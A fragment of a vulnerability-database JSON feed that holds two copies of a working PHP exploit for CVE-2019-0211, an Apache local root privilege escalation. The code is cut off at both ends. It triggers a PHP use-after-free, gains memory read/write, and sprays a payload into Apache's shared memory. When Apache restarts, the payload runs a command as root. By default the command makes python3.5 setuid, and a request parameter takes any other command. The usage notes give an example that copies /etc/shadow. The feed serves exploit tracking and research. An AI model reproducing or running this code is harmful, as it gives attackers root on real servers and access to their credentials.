\n$m = str2ptr($this->abc, $pointer + 0x8 + $j * 8 - $address);  \nif(!in($m, $addresses['libaprX']))  \ncontinue 2;  \no(' [*]: 0x' . dechex($m));  \n}  \n  \n$all_buckets = $i - 0x10;  \no('all_buckets = 0x' . dechex($all_buckets));  \nbreak;  \n}  \n  \nif(!$all_buckets)  \n{  \no('Unable to find all_buckets');  \nexit();  \n}  \n  \no('');  \n  \n# The address of all_buckets will change when apache is gracefully  \n# restarted. This is a problem because we need to know all_buckets's  \n# address in order to make all_buckets[some_index] point to a memory  \n# region we control.  \n  \n#  \n# Compute potential bucket indexes and their addresses  \n#  \n  \no('Computing potential bucket indexes and addresses');  \n  \n# Since we have sizeof($workers_pid) MPM workers, we can fill the rest  \n# of the ap_score_image->servers items, so 256 - sizeof($workers_pids),  \n# with data we like. We keep the one at the top to store our payload.  \n# The rest is sprayed with the address of our payload.  \n  \n$size_prefork_child_bucket = 24;  \n$size_worker_score = 264;  \n# I get strange errors if I use every \"free\" item, so I leave twice as  \n# many items free. I'm guessing upon startup some  \n$spray_size = $size_worker_score * (256 - sizeof($workers_pids) * 2);  \n$spray_max = $addresses['shm'][1];  \n$spray_min = $spray_max - $spray_size;  \n  \n$spray_middle = (int) (($spray_min + $spray_max) / 2);  \n$bucket_index_middle = (int) (  \n- ($all_buckets - $spray_middle) /  \n$size_prefork_child_bucket  \n);  \n  \n#  \n# Build payload  \n#  \n  \n# A worker_score structure was kept empty to put our payload in  \n$payload_start = $spray_min - $size_worker_score;  \n  \n$z = ptr2str(0);  \n  \n# Payload maxsize 264 - 112 = 152  \n# Offset 8 cannot be 0, but other than this you can type whatever  \n# command you want  \n$bucket = isset($_REQUEST['cmd']) ?  \n$_REQUEST['cmd'] :  \n\"chmod +s /usr/bin/python3.5\";  \n  \nif(strlen($bucket) > $size_worker_score - 112)  \n{  \no(  \n'Payload size is bigger than available space (' .  \n($size_worker_score - 112) .  \n'), exiting.'  \n);  \nexit();  \n}  \n# Align  \n$bucket = str_pad($bucket, $size_worker_score - 112, \"\\x00\");  \n  \n# apr_proc_mutex_unix_lock_methods_t  \n$meth =   \n$z .  \n$z .  \n$z .  \n$z .  \n$z .  \n$z .  \n# child_init  \nptr2str($addresses['zend_object_std_dtor'])  \n;  \n  \n# The second pointer points to meth, and is used before reaching the  \n# arbitrary function call  \n# The third one and the last one are both used by the function call  \n# zend_object_std_dtor(object) => ... => system(&arData[0]->val)  \n$properties =   \n# refcount  \nptr2str(1) .  \n# u-nTableMask meth  \nptr2str($payload_start + strlen($bucket)) .  \n# Bucket arData  \nptr2str($payload_start) .  \n# uint32_t nNumUsed;  \nptr2str(1, 4) .  \n# uint32_t nNumOfElements;  \nptr2str(0, 4) .  \n# uint32_t nTableSize  \nptr2str(0, 4) .  \n# uint32_t nInternalPointer  \nptr2str(0, 4) .  \n# zend_long nNextFreeElement  \n$z .  \n# dtor_func_t pDestructor  \nptr2str($addresses['system'])  \n;  \n  \n$payload =  \n$bucket .  \n$meth .  \n$properties  \n;  \n  \n# Write the payload  \n  \no('Placing payload at address 0x' . dechex($payload_start));  \n  \n$p = $payload_start - $address;  \nfor(  \n$i = 0;  \n$i < strlen($payload);  \n$i++  \n)  \n{  \n$this->abc[$p+$i] = $payload[$i];  \n}  \n  \n# Fill the spray area with a pointer to properties  \n  \n$properties_address = $payload_start + strlen($bucket) + strlen($meth);  \no('Spraying pointer');  \no(' Address: 0x' . dechex($properties_address));  \no(' From: 0x' . dechex($spray_min));  \no(' To: 0x' . dechex($spray_max));  \no(' Size: 0x' . dechex($spray_size));  \no(' Covered: 0x' . dechex($spray_size * count($workers_pids)));  \no(' Apache: 0x' . dechex(  \n$addresses['apache'][1] -  \n$addresses['apache'][0]  \n));  \n  \n$s_properties_address = ptr2str($properties_address);  \n  \nfor(  \n$i = $spray_min;  \n$i < $spray_max;  \n$i++  \n)  \n{  \n$this->abc[$i - $address] = $s_properties_address[$i % 8];  \n}  \no('');  \n  \n# Find workers PID in the SHM: it indicates the beginning of their  \n# process_score structure. We can then change process_score.bucket to  \n# the index we computed. When apache reboots, it will use  \n# all_buckets[ap_scoreboard_image->parent[i]->bucket]->mutex  \n# which means we control the whole apr_proc_mutex_t structure.  \n# This structure contains pointers to multiple functions, especially  \n# mutex->meth->child_init(), which will be called before privileges  \n# are dropped.  \n# We do this for every worker PID, incrementing the bucket index so that  \n# we cover a bigger range.  \n  \no('Iterating in SHM to find PIDs...');  \n  \n# Number of bucket indexes covered by our spray  \n$spray_nb_buckets = (int) ($spray_size / $size_prefork_child_bucket);  \n# Number of bucket indexes covered by our spray and the PS structures  \n$total_nb_buckets = $spray_nb_buckets * count($workers_pids);  \n# First bucket index to handle  \n$bucket_index = $bucket_index_middle - (int) ($total_nb_buckets / 2);  \n  \n# Iterate over every process_score structure until we find every PID or  \n# we reach the end of the SHM  \nfor(  \n$p = $addresses['shm'][0] + 0x20;  \n$p < $addresses['shm'][1] && count($workers_pids) > 0;  \n$p += 0x24  \n)  \n{  \n$l = $p - $address;  \n$current_pid = str2ptr($this->abc, $l, 4);  \no('Got PID: ' . $current_pid);  \n# The PID matches one of the workers  \nif(in_array($current_pid, $workers_pids))  \n{  \nunset($workers_pids[$current_pid]);  \no(' PID matches');  \n# Update bucket address  \n$s_bucket_index = pack('l', $bucket_index);  \n$this->abc[$l + 0x20] = $s_bucket_index[0];  \n$this->abc[$l + 0x21] = $s_bucket_index[1];  \n$this->abc[$l + 0x22] = $s_bucket_index[2];  \n$this->abc[$l + 0x23] = $s_bucket_index[3];  \no(' Changed bucket value to ' . $bucket_index);  \n$min = $spray_min - $size_prefork_child_bucket * $bucket_index;  \n$max = $spray_max - $size_prefork_child_bucket * $bucket_index;  \no(' Ranges: 0x' . dechex($min) . ' - 0x' . dechex($max));  \n# This bucket range is covered, go to the next one  \n$bucket_index += $spray_nb_buckets;  \n}  \n}  \n  \nif(count($workers_pids) > 0)  \n{  \no(  \n'Unable to find PIDs ' .  \nimplode(', ', $workers_pids) .  \n' in SHM, exiting.'  \n);  \nexit();  \n}  \n  \no('');  \no('EXPLOIT SUCCESSFUL.');  \no('Await 6:25AM.');  \n  \nreturn 0;  \n}  \n}  \n  \nfunction o($msg)  \n{  \n# No concatenation -> no string allocation  \nprint($msg);  \nprint(\"\\n\");  \n}  \n  \nfunction ptr2str($ptr, $m=8)  \n{  \n$out = \"\";  \nfor ($i=0; $i<$m; $i++)  \n{  \n$out .= chr($ptr & 0xff);  \n$ptr >>= 8;  \n}  \nreturn $out;  \n}  \n  \nfunction str2ptr(&$str, $p, $s=8)  \n{  \n$address = 0;  \nfor($j=$s-1;$j>=0;$j--)  \n{  \n$address <<= 8;  \n$address |= ord($str[$p+$j]);  \n}  \nreturn $address;  \n}  \n  \nfunction in($i, $range)  \n{  \nreturn $i >= $range[0] && $i < $range[1];  \n}  \n  \n/**  \n* Finds the offset of a symbol in a file.  \n*/  \nfunction find_symbol($file, $symbol)  \n{  \n$elf = file_get_contents($file);  \n$e_shoff = str2ptr($elf, 0x28);  \n$e_shentsize = str2ptr($elf, 0x3a, 2);  \n$e_shnum = str2ptr($elf, 0x3c, 2);  \n  \n$dynsym_off = 0;  \n$dynsym_sz = 0;  \n$dynstr_off = 0;  \n  \nfor($i=0;$i<$e_shnum;$i++)  \n{  \n$offset = $e_shoff + $i * $e_shentsize;  \n$sh_type = str2ptr($elf, $offset + 0x04, 4);  \n  \n$SHT_DYNSYM = 11;  \n$SHT_SYMTAB = 2;  \n$SHT_STRTAB = 3;  \n  \nswitch($sh_type)  \n{  \ncase $SHT_DYNSYM:  \n$dynsym_off = str2ptr($elf, $offset + 0x18, 8);  \n$dynsym_sz = str2ptr($elf, $offset + 0x20, 8);  \nbreak;  \ncase $SHT_STRTAB:  \ncase $SHT_SYMTAB:  \nif(!$dynstr_off)  \n$dynstr_off = str2ptr($elf, $offset + 0x18, 8);  \nbreak;  \n}  \n  \n}  \n  \nif(!($dynsym_off && $dynsym_sz && $dynstr_off))  \nexit('.');  \n  \n$sizeof_Elf64_Sym = 0x18;  \n  \nfor($i=0;$i * $sizeof_Elf64_Sym < $dynsym_sz;$i++)  \n{  \n$offset = $dynsym_off + $i * $sizeof_Elf64_Sym;  \n$st_name = str2ptr($elf, $offset, 4);  \n  \nif(!$st_name)  \ncontinue;  \n  \n$offset_string = $dynstr_off + $st_name;  \n$end = strpos($elf, \"\\x00\", $offset_string) - $offset_string;  \n$string = substr($elf, $offset_string, $end);  \n  \nif($string == $symbol)  \n{  \n$st_value = str2ptr($elf, $offset + 0x8, 8);  \nreturn $st_value;  \n}  \n}  \n  \ndie('Unable to find symbol ' . $symbol);  \n}  \n  \n# Obtains the addresses of the shared memory block and some functions through   \n# /proc/self/maps  \n# This is hacky as hell.  \nfunction get_all_addresses()  \n{  \n$addresses = [];  \n$data = file_get_contents('/proc/self/maps');  \n$follows_shm = false;  \n  \nforeach(explode(\"\\n\", $data) as $line)  \n{  \nif(!isset($addresses['shm']) && strpos($line, '/dev/zero'))  \n{  \n$line = explode(' ', $line)[0];  \n$bounds = array_map('hexdec', explode('-', $line));  \nif ($bounds[1] - $bounds[0] == 0x14000)  \n{  \n$addresses['shm'] = $bounds;  \n$follows_shm = true;  \n}  \n}  \nif(  \npreg_match('#(/[^\\s]+libc-[0-9.]+.so[^\\s]*)#', $line, $matches) &&  \nstrpos($line, 'r-xp')  \n)  \n{  \n$offset = find_symbol($matches[1], 'system');  \n$line = explode(' ', $line)[0];  \n$line = hexdec(explode('-', $line)[0]);  \n$addresses['system'] = $line + $offset;  \n}  \nif(  \nstrpos($line, 'libapr-1.so') &&  \nstrpos($line, 'r-xp')  \n)  \n{  \n$line = explode(' ', $line)[0];  \n$bounds = array_map('hexdec', explode('-', $line));  \n$addresses['libaprX'] = $bounds;  \n}  \nif(  \nstrpos($line, 'libapr-1.so') &&  \nstrpos($line, 'r--p')  \n)  \n{  \n$line = explode(' ', $line)[0];  \n$bounds = array_map('hexdec', explode('-', $line));  \n$addresses['libaprR'] = $bounds;  \n}  \n# Apache's memory block is between the SHM and ld.so  \n# Sometimes some rwx region gets mapped; all_buckets cannot be in there  \n# but we include it anyways for the sake of simplicity  \nif(  \n(  \nstrpos($line, 'rw-p') ||  \nstrpos($line, 'rwxp')  \n) &&  \n$follows_shm  \n)  \n{  \nif(strpos($line, '/lib'))  \n{  \n$follows_shm = false;  \ncontinue;  \n}  \n$line = explode(' ', $line)[0];  \n$bounds = array_map('hexdec', explode('-', $line));  \nif(!array_key_exists('apache', $addresses))  \n$addresses['apache'] = $bounds;  \nelse if($addresses['apache'][1] == $bounds[0])  \n$addresses['apache'][1] = $bounds[1];  \nelse  \n$follows_shm = false;  \n}  \nif(  \npreg_match('#(/[^\\s]+libphp7[0-9.]+.so[^\\s]*)#', $line, $matches) &&  \nstrpos($line, 'r-xp')  \n)  \n{  \n$offset = find_symbol($matches[1], 'zend_object_std_dtor');  \n$line = explode(' ', $line)[0];  \n$line = hexdec(explode('-', $line)[0]);  \n$addresses['zend_object_std_dtor'] = $line + $offset;  \n}  \n}  \n  \n$expected = [  \n'shm', 'system', 'libaprR', 'libaprX', 'apache', 'zend_object_std_dtor'  \n];  \n$missing = array_diff($expected, array_keys($addresses));  \n  \nif($missing)  \n{  \no(  \n'The following addresses were not determined by parsing ' .  \n'/proc/self/maps: ' . implode(', ', $missing)  \n);  \nexit(0);  \n}  \n  \n  \no('PID: ' . getmypid());  \no('Fetching addresses');  \n  \nforeach($addresses as $k => $a)  \n{  \nif(!is_array($a))  \n$a = [$a];  \no(' ' . $k . ': ' . implode('-0x', array_map(function($z) {  \nreturn '0x' . dechex($z);  \n}, $a)));  \n}  \no('');  \n  \nreturn $addresses;  \n}  \n  \n# Extracts PIDs of apache workers using /proc/*/cmdline and /proc/*/status,  \n# matching the cmdline and the UID  \nfunction get_workers_pids()  \n{  \no('Obtaining apache workers PIDs');  \n$pids = [];  \n$cmd = file_get_contents('/proc/self/cmdline');  \n$processes = glob('/proc/*');  \nforeach($processes as $process)  \n{  \nif(!preg_match('#^/proc/([0-9]+)$#', $process, $match))  \ncontinue;  \n$pid = (int) $match[1];  \nif(  \n!is_readable($process . '/cmdline') ||  \n!is_readable($process . '/status')  \n)  \ncontinue;  \nif($cmd !== file_get_contents($process . '/cmdline'))  \ncontinue;  \n  \n$status = file_get_contents($process . '/status');  \nforeach(explode(\"\\n\", $status) as $line)  \n{  \nif(  \nstrpos($line, 'Uid:') === 0 &&  \npreg_match('#\\b' . posix_getuid() . '\\b#', $line)  \n)  \n{  \no(' Found apache worker: ' . $pid);  \n$pids[$pid] = $pid;  \nbreak;  \n}  \n  \n}  \n}  \n  \no('Got ' . sizeof($pids) . ' PIDs.');  \no('');  \n  \nreturn $pids;  \n}  \n  \n$addresses = get_all_addresses();  \n$workers_pids = get_workers_pids();  \nreal();  \n`\n",
            "cvss": {
                "score": 0.0,
                "vector": "NONE"
            },
            "vhref": "https://vulners.com/packetstorm/PACKETSTORM:152441"
        },
        {
            "bulletinFamily": "exploit",
            "description": "",
            "modified": "2019-04-08T00:00:00",
            "published": "2019-04-08T00:00:00",
            "id": "EDB-ID:46676",
            "href": "https://www.exploit-db.com/exploits/46676",
            "type": "exploitdb",
            "title": "Apache 2.4.17 &lt; 2.4.38 - &#039;apache2ctl graceful&#039; &#039;logrotate&#039; Local Privilege Escalation",
            "sourceData": "<?php\r\n# CARPE (DIEM): CVE-2019-0211 Apache Root Privilege Escalation\r\n# Charles Fol\r\n# @cfreal_\r\n# 2019-04-08\r\n#\r\n# INFOS\r\n#\r\n# https://cfreal.github.io/carpe-diem-cve-2019-0211-apache-local-root.html\r\n#\r\n# USAGE\r\n#\r\n# 1. Upload exploit to Apache HTTP server\r\n# 2. Send request to page\r\n# 3. Await 6:25AM for logrotate to restart Apache\r\n# 4. python3.5 is now suid 0\r\n#\r\n# You can change the command that is ran as root using the cmd HTTP\r\n# parameter (GET/POST).\r\n# Example: curl http://localhost/carpediem.php?cmd=cp+/etc/shadow+/tmp/\r\n#\r\n# SUCCESS RATE\r\n#\r\n# Number of successful and failed exploitations relative to of the number\r\n# of MPM workers (i.e. Apache subprocesses). YMMV.\r\n#\r\n# W  --% S   F\r\n#  5 87% 177 26 (default)\r\n#  8 89%  60  8\r\n# 10 95%  70  4\r\n#\r\n# More workers, higher success rate.\r\n# By default (5 workers), 87% success rate. With huge HTTPds, close to 100%.\r\n# Generally, failure is due to all_buckets being relocated too far from its\r\n# original address.\r\n#\r\n# TESTED ON\r\n#\r\n# - Apache/2.4.25\r\n# - PHP 7.2.12\r\n# - Debian GNU/Linux 9.6\r\n#\r\n# TESTING\r\n#\r\n# $ curl http://localhost/cfreal-carpediem.php\r\n# $ sudo /usr/sbin/logrotate /etc/logrotate.conf --force\r\n# $ ls -alh /usr/bin/python3.5\r\n# -rwsr-sr-x 2 root root 4.6M Sep 27  2018 /usr/bin/python3.5\r\n#\r\n# There are no hardcoded addresses.\r\n# - Addresses read through /proc/self/mem\r\n# - Offsets read through ELF parsing\r\n#\r\n# As usual, there are tons of comments.\r\n#\r\n\r\n\r\no('CARPE (DIEM) ~ CVE-2019-0211');\r\no('');\r\n\r\nerror_reporting(E_ALL);\r\n\r\n\r\n# Starts the exploit by triggering the UAF.\r\nfunction real()\r\n{\r\n\tglobal $y;\r\n\t$y = [new Z()];\r\n\tjson_encode([0 => &$y]);\r\n}\r\n\r\n# In order to read/write what comes after in memory, we need to UAF a string so\r\n# that we can control its size and make in-place edition.\r\n# An easy way to do that is to replace the string by a timelib_rel_time\r\n# structure of which the first bytes can be reached by the (y, m, d, h, i, s)\r\n# properties of the DateInterval object.\r\n#\r\n# Steps:\r\n# - Create a base object (Z)\r\n# - Add string property (abc) so that sizeof(abc) = sizeof(timelib_rel_time)\r\n# - Create DateInterval object ($place) meant to be unset and filled by another\r\n# - Trigger the UAF by unsetting $y[0], which is still reachable using $this\r\n# - Unset $place: at this point, if we create a new DateInterval object, it will\r\n#   replace $place in memory\r\n# - Create a string ($holder) that fills $place's timelib_rel_time structure\r\n# - Allocate a new DateInterval object: its timelib_rel_time structure will\r\n#   end up in place of abc\r\n# - Now we can control $this->abc's zend_string structure entirely using\r\n#   y, m, d etc.\r\n# - Increase abc's size so that we can read/write memory that comes after it,\r\n#   especially the shared memory block\r\n# - Find out all_buckets' position by finding a memory region that matches the\r\n#   mutex->meth structure\r\n# - Compute the bucket index required to reach the SHM and get an arbitrary\r\n#   function call\r\n# - Scan ap_scoreboard_image->parent[] to find workers' PID and replace the\r\n#   bucket\r\nclass Z implements JsonSerializable\r\n{\r\n\tpublic function jsonSerialize()\r\n\t{\r\n\t\tglobal $y, $addresses, $workers_pids;\r\n\r\n\t\t#\r\n\t\t# Setup memory\r\n\t\t#\r\n        o('Triggering UAF');\r\n\t\to('  Creating room and filling empty spaces');\r\n\r\n\t\t# Fill empty blocks to make sure our allocations will be contiguous\r\n\t\t# I: Since a lot of allocations/deallocations happen before the script\r\n\t\t# is ran, two variables instanciated at the same time might not be\r\n\t\t# contiguous: this can be a problem for a lot of reasons.\r\n\t\t# To avoid this, we instanciate several DateInterval objects. These\r\n\t\t# objects will fill a lot of potentially non-contiguous memory blocks,\r\n\t\t# ensuring we get \"fresh memory\" in upcoming allocations.\r\n\t\t$contiguous = [];\r\n\t\tfor($i=0;$i<10;$i++)\r\n\t\t\t$contiguous[] = new DateInterval('PT1S');\r\n\r\n\t\t# Create some space for our UAF blocks not to get overwritten\r\n\t\t# I: A PHP object is a combination of a lot of structures, such as\r\n\t\t# zval, zend_object, zend_object_handlers, zend_string, etc., which are\r\n\t\t# all allocated, and freed when the object is destroyed.\r\n\t\t# After the UAF is triggered on the object, all the structures that are\r\n\t\t# used to represent it will be marked as free.\r\n\t\t# If we create other variables afterwards, those variables might be\r\n\t\t# allocated in the object's previous memory regions, which might pose\r\n\t\t# problems for the rest of the exploitation.\r\n\t\t# To avoid this, we allocate a lot of objects before the UAF, and free\r\n\t\t# them afterwards. Since PHP's heap is LIFO, when we create other vars,\r\n\t\t# they will take the place of those objects instead of the object we\r\n\t\t# are triggering the UAF on. This means our object is \"shielded\" and\r\n\t\t# we don't have to worry about breaking it.\r\n\t\t$room = [];\r\n\t\tfor($i=0;$i<10;$i++)\r\n\t\t\t$room[] = new Z();\r\n\r\n\t\t# Build string meant to fill old DateInterval's timelib_rel_time\r\n\t\t# I: ptr2str's name is unintuitive here: we just want to allocate a\r\n\t\t# zend_string of size 78.\r\n\t\t$_protector = ptr2str(0, 78);\r\n\r\n\t\to('  Allocating $abc and $p');\r\n\r\n\t\t# Create ABC\r\n\t\t# I: This is the variable we will use to R/W memory afterwards.\r\n\t\t# After we free the Z object, we'll make sure abc is overwritten by a\r\n\t\t# timelib_rel_time structure under our control. The first 8*8 = 64 bytes\r\n\t\t# of this structure can be modified easily, meaning we can change the\r\n\t\t# size of abc. This will allow us to read/write memory after abc.\r\n\t\t$this->abc = ptr2str(0, 79);\r\n\r\n\t\t# Create $p meant to protect $this's blocks\r\n\t\t# I: Right after we trigger the UAF, we will unset $p.\r\n\t\t# This means that the timelib_rel_time structure (TRT) of this object\r\n\t\t# will be freed. We will then allocate a string ($protector) of the same\r\n\t\t# size as TRT. Since PHP's heap is LIFO, the string will take the place\r\n\t\t# of the now-freed TRT in memory.\r\n\t\t# Then, we create a new DateInterval object ($x). From the same\r\n\t\t# assumption, every structure constituting this new object will take the\r\n\t\t# place of the previous structure. Nevertheless, since TRT's memory\r\n\t\t# block has already been replaced by $protector, the new TRT will be put\r\n\t\t# in the next free blocks of the same size, which happens to be $abc\r\n\t\t# (remember, |abc| == |timelib_rel_time|).\r\n\t\t# We now have the following situation: $x is a DateInterval object whose\r\n\t\t# internal TRT structure has the same address as $abc's zend_string.\r\n\t\t$p = new DateInterval('PT1S');\r\n\r\n\t\t#\r\n\t\t# Trigger UAF\r\n\t\t#\r\n\t\t\r\n\t\to('  Unsetting both variables and setting $protector');\r\n\t\t# UAF here, $this is usable despite being freed\r\n\t\tunset($y[0]);\r\n\t\t# Protect $this's freed blocks\r\n\t\tunset($p);\r\n\r\n\t\t# Protect $p's timelib_rel_time structure\r\n\t\t$protector = \".$_protector\";\r\n\t\t# !!! This is only required for apache\r\n\t\t# Got no idea as to why there is an extra deallocation (?)\r\n\t\t$room[] = \"!$_protector\";\r\n\r\n\t\to('  Creating DateInterval object');\r\n\t\t# After this line:\r\n\t\t# &((php_interval_obj) x).timelib_rel_time == ((zval) abc).value.str\r\n\t\t# We can control the structure of $this->abc and therefore read/write\r\n\t\t# anything that comes after it in memory by changing its size and\r\n\t\t# making in-place edits using $this->abc[$position] = $char\r\n\t\t$x = new DateInterval('PT1S');\r\n\t\t# zend_string.refcount = 0\r\n\t\t# It will get incremented at some point, and if it is > 1,\r\n\t\t# zend_assign_to_string_offset() will try to duplicate it before making\r\n\t\t# the in-place replacement\r\n\t\t$x->y = 0x00;\r\n\t\t# zend_string.len\r\n\t\t$x->d = 0x100;\r\n\t\t# zend_string.val[0-4]\r\n\t\t$x->h = 0x13121110;\r\n\r\n\t\t# Verify UAF was successful\r\n\t\t# We modified stuff via $x; they should be visible by $this->abc, since\r\n\t\t# they are at the same memory location.\r\n\t\tif(!(\r\n\t\t\tstrlen($this->abc) === $x->d &&\r\n\t\t\t$this->abc[0] == \"\\x10\" &&\r\n\t\t\t$this->abc[1] == \"\\x11\" &&\r\n\t\t\t$this->abc[2] == \"\\x12\" &&\r\n\t\t\t$this->abc[3] == \"\\x13\"\r\n\t\t))\r\n\t\t{\r\n\t\t\to('UAF failed, exiting.');\r\n\t\t\texit();\r\n\t\t}\r\n\t\to('UAF successful.');\r\n\t\to('');\r\n\r\n\t\t# Give us some room\r\n\t\t# I: As indicated before, just unset a lot of stuff so that next allocs\r\n\t\t# don't break our fragile UAFd structure.\r\n\t\tunset($room);\r\n\r\n\t\t#\r\n\t\t# Setup the R/W primitive\r\n\t\t#\r\n\r\n\t\t# We control $abc's internal zend_string structure, therefore we can R/W\r\n\t\t# the shared memory block (SHM), but for that we need to know the\r\n\t\t# position of $abc in memory\r\n\t\t# I: We know the absolute position of the SHM, so we need to need abc's\r\n\t\t# as well, otherwise we cannot compute the offset\r\n\r\n\t\t# Assuming the allocation was contiguous, memory looks like this, with\r\n\t\t# 0x70-sized fastbins:\r\n\t\t# \t[zend_string:abc]\r\n\t\t# \t[zend_string:protector]\r\n\t\t# \t[FREE#1]\r\n\t\t# \t[FREE#2]\r\n\t\t# Therefore, the address of the 2nd free block is in the first 8 bytes\r\n\t\t# of the first block: 0x70 * 2 - 24\r\n\t\t$address = str2ptr($this->abc, 0x70 * 2 - 24);\r\n\t\t# The address we got points to FREE#2, hence we're |block| * 3 higher in\r\n\t\t# memory\r\n\t\t$address = $address - 0x70 * 3;\r\n\t\t# The beginning of the string is 24 bytes after its origin\r\n\t\t$address = $address + 24;\r\n\t\to('Address of $abc: 0x' . dechex($address));\r\n\t\to('');\r\n\r\n\t\t# Compute the size required for our string to include the whole SHM and\r\n\t\t# apache's memory region\r\n\t\t$distance = \r\n\t\t\tmax($addresses['apache'][1], $addresses['shm'][1]) -\r\n\t\t\t$address\r\n\t\t;\r\n\t\t$x->d = $distance;\r\n\r\n\t\t# We can now read/write in the whole SHM and apache's memory region.\r\n\r\n\t\t#\r\n\t\t# Find all_buckets in memory\r\n\t\t#\r\n\r\n\t\t# We are looking for a structure s.t.\r\n\t\t# |all_buckets, mutex| = 0x10\r\n\t\t# |mutex, meth| = 0x8\r\n\t\t# all_buckets is in apache's memory region\r\n\t\t# mutex is in apache's memory region\r\n\t\t# meth is in libaprR's memory region\r\n\t\t# meth's function pointers are in libaprX's memory region\r\n\t\to('Looking for all_buckets in memory');\r\n\t\t$all_buckets = 0;\r\n\r\n\t\tfor(\r\n\t\t\t$i = $addresses['apache'][0] + 0x10;\r\n\t\t\t$i < $addresses['apache'][1] - 0x08;\r\n\t\t\t$i += 8\r\n\t\t)\r\n\t\t{\r\n\t\t\t# mutex\r\n\t\t\t$mutex = $pointer = str2ptr($this->abc, $i - $address);\r\n\t\t\tif(!in($pointer, $addresses['apache']))\r\n\t\t\t\tcontinue;\r\n\r\n\r\n\t\t\t# meth\r\n\t\t\t$meth = $pointer = str2ptr($this->abc, $pointer + 0x8 - $address);\r\n\t\t\tif(!in($pointer, $addresses['libaprR']))\r\n\t\t\t\tcontinue;\r\n\r\n\t\t\to('  [&mutex]: 0x' . dechex($i));\r\n\t\t\to('    [mutex]: 0x' . dechex($mutex));\r\n\t\t\to('      [meth]: 0x' . dechex($meth));\r\n\r\n\r\n\t\t\t# meth->*\r\n\t\t\t# flags\r\n\t\t\tif(str2ptr($this->abc, $pointer - $address) != 0)\r\n\t\t\t\tcontinue;\r\n\t\t\t# methods\r\n\t\t\tfor($j=0;$j<7;$j++)\r\n\t\t\t{\r\n\t\t\t\t$m = str2ptr($this->abc, $pointer + 0x8 + $j * 8 - $address);\r\n\t\t\t\tif(!in($m, $addresses['libaprX']))\r\n\t\t\t\t\tcontinue 2;\r\n\t\t\t\to('        [*]: 0x' . dechex($m));\r\n\t\t\t}\r\n\r\n\t\t\t$all_buckets = $i - 0x10;\r\n\t\t\to('all_buckets = 0x' . dechex($all_buckets));\r\n\t\t\tbreak;\r\n\t\t}\r\n\r\n\t\tif(!$all_buckets)\r\n\t\t{\r\n\t\t\to('Unable to find all_buckets');\r\n\t\t\texit();\r\n\t\t}\r\n\r\n\t\to('');\r\n\r\n\t\t# The address of all_buckets will change when apache is gracefully\r\n\t\t# restarted. This is a problem because we need to know all_buckets's\r\n\t\t# address in order to make all_buckets[some_index] point to a memory\r\n\t\t# region we control.\r\n\r\n\t\t#\r\n\t\t# Compute potential bucket indexes and their addresses\r\n\t\t#\r\n\r\n        o('Computing potential bucket indexes and addresses');\r\n\r\n\t\t# Since we have sizeof($workers_pid) MPM workers, we can fill the rest\r\n\t\t# of the ap_score_image->servers items, so 256 - sizeof($workers_pids),\r\n\t\t# with data we like. We keep the one at the top to store our payload.\r\n\t\t# The rest is sprayed with the address of our payload.\r\n\r\n\t\t$size_prefork_child_bucket = 24;\r\n\t\t$size_worker_score = 264;\r\n\t\t# I get strange errors if I use every \"free\" item, so I leave twice as\r\n\t\t# many items free. I'm guessing upon startup some\r\n\t\t$spray_size = $size_worker_score * (256 - sizeof($workers_pids) * 2);\r\n\t\t$spray_max = $addresses['shm'][1];\r\n\t\t$spray_min = $spray_max - $spray_size;\r\n\r\n\t\t$spray_middle = (int) (($spray_min + $spray_max) / 2);\r\n\t\t$bucket_index_middle = (int) (\r\n\t\t\t- ($all_buckets - $spray_middle) /\r\n\t\t\t$size_prefork_child_bucket\r\n\t\t);\r\n\r\n\t\t#\r\n\t\t# Build payload\r\n\t\t#\r\n\r\n\t\t# A worker_score structure was kept empty to put our payload in\r\n\t\t$payload_start = $spray_min - $size_worker_score;\r\n\r\n\t\t$z = ptr2str(0);\r\n\r\n    \t# Payload maxsize 264 - 112 = 152\r\n\t\t# Offset 8 cannot be 0, but other than this you can type whatever\r\n\t\t# command you want\r\n    \t$bucket = isset($_REQUEST['cmd']) ?\r\n    \t\t$_REQUEST['cmd'] :\r\n    \t\t\"chmod +s /usr/bin/python3.5\";\r\n\r\n    \tif(strlen($bucket) > $size_worker_score - 112)\r\n\t\t{\r\n\t\t\to(\r\n\t\t\t\t'Payload size is bigger than available space (' .\r\n\t\t\t\t($size_worker_score - 112) .\r\n\t\t\t\t'), exiting.'\r\n\t\t\t);\r\n\t\t\texit();\r\n\t\t}\r\n    \t# Align\r\n    \t$bucket = str_pad($bucket, $size_worker_score - 112, \"\\x00\");\r\n\r\n    \t# apr_proc_mutex_unix_lock_methods_t\r\n\t\t$meth = \r\n\t\t    $z .\r\n\t\t    $z .\r\n\t\t    $z .\r\n\t\t    $z .\r\n\t\t    $z .\r\n\t\t    $z .\r\n\t\t\t# child_init\r\n\t\t    ptr2str($addresses['zend_object_std_dtor'])\r\n\t\t;\r\n\r\n\t\t# The second pointer points to meth, and is used before reaching the\r\n\t\t# arbitrary function call\r\n\t\t# The third one and the last one are both used by the function call\r\n\t\t# zend_object_std_dtor(object) => ... => system(&arData[0]->val)\r\n\t\t$properties = \r\n\t\t\t# refcount\r\n\t\t\tptr2str(1) .\r\n\t\t\t# u-nTableMask meth\r\n\t\t\tptr2str($payload_start + strlen($bucket)) .\r\n\t\t\t# Bucket arData\r\n\t\t\tptr2str($payload_start) .\r\n\t\t\t# uint32_t nNumUsed;\r\n\t\t\tptr2str(1, 4) .\r\n\t\t    # uint32_t nNumOfElements;\r\n\t\t\tptr2str(0, 4) .\r\n\t\t\t# uint32_t nTableSize\r\n\t\t\tptr2str(0, 4) .\r\n\t\t\t# uint32_t nInternalPointer\r\n\t\t\tptr2str(0, 4) .\r\n\t\t\t# zend_long nNextFreeElement\r\n\t\t\t$z .\r\n\t\t\t# dtor_func_t pDestructor\r\n\t\t\tptr2str($addresses['system'])\r\n\t\t;\r\n\r\n\t\t$payload =\r\n\t\t\t$bucket .\r\n\t\t\t$meth .\r\n\t\t\t$properties\r\n\t\t;\r\n\r\n\t\t# Write the payload\r\n\r\n\t\to('Placing payload at address 0x' . dechex($payload_start));\r\n\r\n\t\t$p = $payload_start - $address;\r\n\t\tfor(\r\n\t\t\t$i = 0;\r\n\t\t\t$i < strlen($payload);\r\n\t\t\t$i++\r\n\t\t)\r\n\t\t{\r\n\t\t\t$this->abc[$p+$i] = $payload[$i];\r\n\t\t}\r\n\r\n\t\t# Fill the spray area with a pointer to properties\r\n\t\t\r\n\t\t$properties_address = $payload_start + strlen($bucket) + strlen($meth);\r\n\t\to('Spraying pointer');\r\n\t\to('  Address: 